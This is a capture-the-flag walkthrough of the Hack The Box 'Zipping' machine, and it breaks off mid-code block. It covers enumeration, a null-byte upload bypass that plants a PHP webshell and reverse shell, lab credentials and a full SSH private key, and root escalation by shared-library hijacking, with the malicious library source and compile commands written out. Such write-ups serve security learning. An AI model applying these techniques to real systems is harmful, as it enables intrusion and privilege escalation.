# Network Enumeration:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
|   256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=8/28%OT=22%CT=%CU=31278%PV=Y%DS=2%DC=T%G=N%TM=64EC44D8%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)
SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)
```

# SSH:

As usual ssh service running on port TCP/22 will not br our first way in, the running version identified by NMAP scanner shows that no known exploit are available in the wild. Bruteforce won't be pursuit as our ma9in goal isn't to create disruption.

# HTTP:

Surfing manually on the website we are in front of a pretty normal webpage:

![4b3ee9075eddc7be44b980d98403d950.png](../../../_resources/4b3ee9075eddc7be44b980d98403d950.png)

I liberally added "zipping.htb" to my hosts file to make things smooth!

Before anything I will start by probing for possible VHOST available on the machine:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/TEMP]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://zipping.htb/ -H "Host:FUZZ.zipping.htb" -fl 318

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://zipping.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.zipping.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 318
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 547 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

Nothing much, it might also that "zipping.htb" is not the right VHOST to use for fuzzing but I will move forward for now with enumeration and check for possible hidden web directories:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/TEMP]
└─# dirsearch -u "http://zipping.htb/"                                                                                 

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/aleksandar/Downloads/TEMP/reports/http_zipping.htb/__23-08-28_09-11-48.txt

Target: http://zipping.htb/

[09:11:48] Starting: 
[09:11:51] 403 -  276B  - /.ht_wsr.txt                                      
[09:11:51] 403 -  276B  - /.htaccess.bak1                                   
[09:11:51] 403 -  276B  - /.htaccess.sample                                 
[09:11:51] 403 -  276B  - /.htaccess.orig                                   
[09:11:51] 403 -  276B  - /.htaccess.save
[09:11:51] 403 -  276B  - /.htaccess_extra                                  
[09:11:51] 403 -  276B  - /.htaccess_orig
[09:11:51] 403 -  276B  - /.htaccessOLD
[09:11:51] 403 -  276B  - /.htaccessBAK
[09:11:51] 403 -  276B  - /.htaccess_sc
[09:11:51] 403 -  276B  - /.htaccessOLD2
[09:11:51] 403 -  276B  - /.html                                            
[09:11:51] 403 -  276B  - /.htm
[09:11:51] 403 -  276B  - /.htpasswd_test                                   
[09:11:51] 403 -  276B  - /.htpasswds                                       
[09:11:51] 403 -  276B  - /.httr-oauth
[09:11:52] 403 -  276B  - /.php                                             
[09:12:02] 301 -  311B  - /assets  ->  http://zipping.htb/assets/           
[09:12:02] 200 -  510B  - /assets/                                          
[09:12:26] 403 -  276B  - /server-status/                                   
[09:12:26] 403 -  276B  - /server-status                                    
[09:12:27] 301 -  309B  - /shop  ->  http://zipping.htb/shop/               
[09:12:32] 200 -    2KB - /upload.php                                       
[09:12:32] 403 -  276B  - /uploads/                                         
[09:12:32] 301 -  312B  - /uploads  ->  http://zipping.htb/uploads/
```

What I see strangely here is the upload folder and upload.php function which indicates some kind of upload capability, and a shop folder as well! I will start by catching that upload function and checking what we can get our of it!

First thing first what we know:

- Upload function only accepts zip archives that contain pdf files

I will start by uploading a dummy zipfile and catch the request via Burpsuite:

![de29a45f58393af21916c0cf0b9aa5c9.png](../../../_resources/de29a45f58393af21916c0cf0b9aa5c9.png)

As we can see from the front end we get a link in the upload folder:

![e673e0548f7b0941ab2ae706817eac31.png](../../../_resources/e673e0548f7b0941ab2ae706817eac31.png)

We can do same to get file path from a Burpsuite:

![154ffa3d22f951b044792c6e9707dcbe.png](../../../_resources/154ffa3d22f951b044792c6e9707dcbe.png)

From here I tried to play around with GET path by back stepping with ../ but couldn't make it working. So I moved forward to /shop page:

![b5b8b5538b1a6bfdf8753ef5fb011c3e.png](../../../_resources/b5b8b5538b1a6bfdf8753ef5fb011c3e.png)

On this webshop we can do basic stuff like add, update, clear items and lastly place a order from the shopping cart and here I might have found something interesting, check here on what we catched in burpsuite:

```
POST /shop/index.php?page=cart HTTP/1.1
Host: zipping.htb
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://zipping.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://zipping.htb/shop/index.php?page=cart
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=sc3i7o3dsia280srjbng3c9juk
Connection: close

quantity-3=1&update=Update
```

This is just an example from the Update function but we can see that shop/index.php it calls the cart which might be a php file in the shop folder. This might be a sign of a possible LFI? Now here I checked for tips and apparently this involves a pretty new exploit that targets ZIP archive symlinks: https://blog.pentesteracademy.com/from-zip-slip-to-system-takeover-8564433ea542

I will try to use a PHP webshell masqueraded as pdf file(using magic bytes tampering) which supposely should trick the webserver into thinking that this is a php but indeed it's a php file instead: https://github.com/justikail/webshell

But nothing worked so I followed this guide:

https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

First I created a new php webshell:

```
──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/TEMP]
└─# zip archive.zip shell.phpD.pdf                                                                                                                                                                                                                           
  adding: shell.phpD.pdf (stored 0%)
```

Next we are changing the D in the second part of the hex code:

![192a86f83edaa1f0bea5a2be40a2c2db.png](../../../_resources/192a86f83edaa1f0bea5a2be40a2c2db.png)

Now after we successfully upload the file we could use that bug in certail PHP webservers where it truncate the file name after null byte:

![a30b35cba721c38491fb3d01e215a8a2.png](../../../_resources/a30b35cba721c38491fb3d01e215a8a2.png)

Ok seems like the file get's deleted to fast, so I need to use a php revshell instead!

 And I managed to get a revshell by using this one: https://github.com/artyuum/Simple-PHP-Web-Shell

Together with a Python3 revshell!

![92d34f9694695ccda95b82fe68ca2d0a.png](../../../_resources/92d34f9694695ccda95b82fe68ca2d0a.png)

Next beeing inside we can find the DB password in one of the php files:

```
rektsu@zipping:/var/www/html/shop$ ls
ls
assets    functions.php  index.php       product.php
cart.php  home.php       placeorder.php  products.php
rektsu@zipping:/var/www/html/shop$ cat functions.php
cat functions.php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
        // If there is an error with the connection, stop the script and display the error.
        exit('Failed to connect to database!');
```

on same way there is only one user except root which is our one, which let's us get the first flag plus the ssh key to gain persistence:

```
rektsu@zipping:/home/rektsu$ cat user.txt
cat user.txt
663afdf029ce9732d93c3193540324a3
rektsu@zipping:/home/rektsu$ ls -l ./ssh
ls -l ./ssh
ls: cannot access './ssh': No such file or directory
rektsu@zipping:/home/rektsu$ cd .ssh
cd .ssh
rektsu@zipping:/home/rektsu/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
rektsu@zipping:/home/rektsu/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
rektsu@zipping:/home/rektsu/.ssh$
```

Now about what we can found with Linpeas:

```
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                                           
                              ╚════════════════════╝                                                                                                                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                                           
Linux version 5.19.0-46-generic (buildd@lcy02-amd64-061) (x86_64-linux-gnu-gcc-12 (Ubuntu 12.2.0-3ubuntu1) 12.2.0, GNU ld (GNU Binutils for Ubuntu) 2.39) #47-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 16 13:30:11 UTC 2023                                        
Distributor ID: Ubuntu
Description:    Ubuntu 22.10
Release:        22.10
Codename:       kinetic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                                              
Sudo version 1.9.11p3                                                                                                                                                                                                                                        


╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                                             
Matching Defaults entries for rektsu on zipping:                                                                                                                                                                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Here what I see is that both kernel and sudo version are not vulnerable to any recent exploit avaialble so far but we can see that rektsu user can run as root the stock custom binary.

Seems like we need a password first, and root password from SQL is not working:

```
rektsu@zipping:/tmp$ sudo -u root /usr/bin/stock
Enter the password: 123456789
Invalid password, please try again.
rektsu@zipping:/tmp$ sudo /usr/bin/stock
Enter the password: 123456789
Invalid password, please try again.
rektsu@zipping:/tmp$ sudo /usr/bin/stock
Enter the password: MySQL_P@ssw0rd!
Invalid password, please try again.
rektsu@zipping:/tmp$
```

I will download the file locally and check it with Ghirdra. But first let's check for strings in the file:

```
rektsu@zipping:/tmp$ strings /usr/bin/stock 
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
Select an option: 
You do not have permissions to read the file
File could not be opened.
================== Stock Actual ==================
Colour     Black   Gold    Silver
Amount     %-7d %-7d %-7d
Quality   Excelent Average Poor
Amount    %-9d %-7d %-4d
Exclusive Yes    No
Amount    %-4d   %-4d
```

Seems like that might be a password:

```
rektsu@zipping:/tmp$ sudo -u root stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 1

================== Stock Actual ==================

Colour     Black   Gold    Silver
Amount     -712355845 32766   0      

Quality   Excelent Average Poor
Amount    0         23      0   

Exclusive Yes    No
Amount    23     72  

Warranty  Yes    No
Amount    0      24  


================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 2

================== Edit Stock ==================

Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver): 0
Quality (0: excelent, 1: average, 2: poor): 0
Exclusivity (0: yes, 1: no): 1
Warranty (0: yes, 1: no): 0
Amount: 1234356
The stock has been updated correctly.

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 3
```

Indeed it's working! But now we have to see exactly what the edit function works, I see that function open the file /root/.stock.csv 

Now here I had to check for tips and apparently we should be able to hijack the libraries, so let's check with ldd which custom libraries the binary loads up:

```
rektsu@zipping:/tmp$ ldd /usr/bin/stock 
        linux-vdso.so.1 (0x00007ffea327e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f95c7200000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f95c750e000)
```

We can see that file get's called is custom:

```
rektsu@zipping:/tmp$ readelf -d /usr/bin/stock 

Dynamic section at offset 0x2de0 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x1a44
 0x0000000000000019 (INIT_ARRAY)         0x3dd0
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dd8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x5a8
 0x0000000000000006 (SYMTAB)             0x3c8
 0x000000000000000a (STRSZ)              258 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fe8
 0x0000000000000002 (PLTRELSZ)           312 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x7f0
 0x0000000000000007 (RELA)               0x718
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x6d8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x6aa
 0x000000006ffffff9 (RELACOUNT)          3
 0x0000000000000000 (NULL)               0x0
```

Now from here we should take as granted that the target libraby is the lic.so.6 but we need to understand where it get's loaded from. Now I didn't know but apparently you may use ltrace as well to do same stuff:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/TEMP]
└─# ltrace ./stock 
printf("Enter the password: ")                                                                                                                               = 20
fgets(Enter the password: St0ckM4nager
"St0ckM4nager\n", 30, 0x7f2a34413aa0)                                                                                                                  = 0x7ffde1212d60
strchr("St0ckM4nager\n", '\n')                                                                                                                               = "\n"
strcmp("St0ckM4nager", "St0ckM4nager")                                                                                                                       = 0
dlopen("/home/rektsu/.config/libcounter."..., 1)                                                                                                             = 0
puts("\n================== Menu ======="...
================== Menu ==================

)                                                                                                                 = 45
puts("1) See the stock"1) See the stock
)                                                                                                                                     = 17
puts("2) Edit the stock"2) Edit the stock
)                                                                                                                                    = 18
puts("3) Exit the program\n"3) Exit the program

)                                                                                                                                = 21
printf("Select an option: ")                                                                                                                                 = 18
__isoc99_scanf(0x565134b140e0, 0x7ffde1212d8c, 0, 0Select an option: 1
)                                                                                                         = 1
fopen("/root/.stock.csv", "r")                                                                                                                               = 0
__errno_location()                                                                                                                                           = 0x7f2a3423d6c8
puts("File could not be opened."File could not be opened.
)                                                                                                                            = 26
exit(1 <no return ...>
+++ exited (status 1) +++
```

As you can see ltrace shows much more verbose that readelf command. But we can see that a library get's loaded from rektsu/.config

Now knowing that we have write permission over that folder and the library get's loaded is most likely "libcounter.so". So first we prepare the binary that will create a suid on the process we run:

```
rektsu@zipping:~$ cat libcounter.c 
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

Next we compile the needed custom library under .config:

```
rektsu@zipping:~$ gcc libcounter.c -fPIC -shared -o .config/libcounter.so
libcounter.c: In function ‘dbquery’:
libcounter.c:6:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    6 |     setuid(0);
      |     ^~~~~~
rektsu@zipping:~$ ll .config/
total 24
drwxrwxr-x 2 rektsu rektsu  4096 Aug 28 11:35 ./
drwxr-x--x 7 rektsu rektsu  4096 Aug 28 11:33 ../
-rwxrwxr-x 1 rektsu rektsu 15648 Aug 28 11:35 libcounter.so*
rektsu@zipping:~$
```

Unforunately this was not working cause we were pointing to a specific missing function and we should have used a more "generic" code like this(got from Boom Hacktricks):

```
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```
rektsu@zipping:~$ gcc libcounter.c -fPIC -shared -o .config/libcounter.so
libcounter.c: In function ‘hijack’:
libcounter.c:7:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
    7 |         setresuid(0,0,0);
      |         ^~~~~~~~~
rektsu@zipping:~$ ll .config/
total 24
drwxrwxr-x 2 rektsu rektsu  4096 Aug 28 11:52 ./
drwxr-x--x 7 rektsu rektsu  4096 Aug 28 11:52 ../
-rwxrwxr-x 1 rektsu rektsu 15600 Aug 28 11:52 libcounter.so*
rektsu@zipping:~$ sudo stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu# id
uid=0(root) gid=0(root) groups=0(root)
root@zipping:/home/rektsu# cd /root
root@zipping:~# ls
root.txt
root@zipping:~# cat root.txt
```

And with that we magically got a root shell within our first shell!

# POST Analysys

Now I should have used strace instead of ltrace and I would have found more verbose that ltrace(even if ltrace is mainly used to debug library calls and strace mainly for system calls)

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/TEMP]
└─# strace ./stock               
execve("./stock", ["./stock"], 0x7ffd7f7360b0 /* 31 vars */) = 0
brk(NULL)                               = 0x5600a883c000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f66c4994000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=120818, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 120818, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f66c4976000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220x\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1926256, ...}, AT_EMPTY_PATH) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 1974096, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f66c4794000
mmap(0x7f66c47ba000, 1396736, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f66c47ba000
mmap(0x7f66c490f000, 344064, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x17b000) = 0x7f66c490f000
mmap(0x7f66c4963000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1cf000) = 0x7f66c4963000
mmap(0x7f66c4969000, 53072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f66c4969000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f66c4791000
arch_prctl(ARCH_SET_FS, 0x7f66c4791740) = 0
set_tid_address(0x7f66c4791a10)         = 13452
set_robust_list(0x7f66c4791a20, 24)     = 0
rseq(0x7f66c4792060, 0x20, 0, 0x53053053) = 0
mprotect(0x7f66c4963000, 16384, PROT_READ) = 0
mprotect(0x5600a7e32000, 4096, PROT_READ) = 0
mprotect(0x7f66c49c6000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f66c4976000, 120818)          = 0
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x5), ...}, AT_EMPTY_PATH) = 0
getrandom("\x7c\x42\x49\x12\x8e\x1c\x7b\xa9", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x5600a883c000
brk(0x5600a885d000)                     = 0x5600a885d000
newfstatat(0, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x5), ...}, AT_EMPTY_PATH) = 0
write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
================== Menu ==================
) = 44
write(1, "\n", 1
)                       = 1
write(1, "1) See the stock\n", 171) See the stock
)      = 17
write(1, "2) Edit the stock\n", 182) Edit the stock
)     = 18
write(1, "3) Exit the program\n", 203) Exit the program
)   = 20
write(1, "\n", 1
)                       = 1
write(1, "Select an option: ", 18Select an option: )      = 18
read(0, 1
"1\n", 1024)                    = 2
openat(AT_FDCWD, "/root/.stock.csv", O_RDONLY) = -1 ENOENT (No such file or directory)
write(1, "File could not be opened.\n", 26File could not be opened.
) = 26
lseek(0, -1, SEEK_CUR)                  = -1 ESPIPE (Illegal seek)
exit_group(1)                           = ?
+++ exited with 1 +++
```

From here we could see the full path of the libcounter.so and as well a error message that is pointing to the file missing making this even easier for us!

Another post analysis was the possibility to omit the SETSUID code since we were running the the binary already as sudo!
Resulting something like this instead:

```
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

